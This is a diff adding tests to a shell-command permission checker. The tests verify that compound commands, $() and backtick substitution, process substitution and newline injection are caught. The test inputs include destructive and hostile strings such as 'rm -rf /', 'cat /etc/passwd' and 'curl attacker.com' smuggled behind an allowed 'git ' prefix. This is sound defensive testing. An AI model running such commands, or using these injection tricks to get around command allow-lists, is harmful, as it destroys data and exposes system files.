@@ -28,6 +28,27 @@ describe("isCompoundCommand", () => {
   test("detects multiple operators", () => {
     expect(isCompoundCommand("a && b || c; d | e")).toBe(true);
   });
+
+  // ── Command substitution detection ──
+
+  test("detects $() command substitution", () => {
+    expect(isCompoundCommand("git status $(rm -rf /)")).toBe(true);
+    expect(isCompoundCommand("echo $(whoami)")).toBe(true);
+  });
+
+  test("detects backtick command substitution", () => {
+    expect(isCompoundCommand("git status `rm -rf /`")).toBe(true);
+    expect(isCompoundCommand("echo `whoami`")).toBe(true);
+  });
+
+  test("detects process substitution", () => {
+    expect(isCompoundCommand("diff <(git status) <(cat /etc/passwd)")).toBe(true);
+    expect(isCompoundCommand("cat >(tee /tmp/log)")).toBe(true);
+  });
+
+  test("detects embedded newlines", () => {
+    expect(isCompoundCommand("git status\nrm -rf /")).toBe(true);
+  });
 });
 
 describe("matchBashCommand", () => {
@@ -83,5 +104,23 @@ describe("matchBashCommand", () => {
   test("compound rejection on colon-format prefix", () => {
     expect(matchBashCommand("bun test && rm -rf /", "bun ")).toBe(false);
     expect(matchBashCommand("bun test | grep fail", "bun ")).toBe(false);
+  });
+
+  // ── Command substitution rejection ──
+
+  test("rejects backtick substitution on prefix match", () => {
+    expect(matchBashCommand("git status `rm -rf /`", "git ")).toBe(false);
+  });
+
+  test("rejects $() substitution on prefix match", () => {
+    expect(matchBashCommand("git status $(curl attacker.com)", "git ")).toBe(false);
+  });
+
+  test("rejects process substitution on prefix match", () => {
+    expect(matchBashCommand("git diff <(cat /etc/passwd)", "git ")).toBe(false);
+  });
+
+  test("rejects newline injection on prefix match", () => {
+    expect(matchBashCommand("git status\nrm -rf /", "git ")).toBe(false);
   });
 });
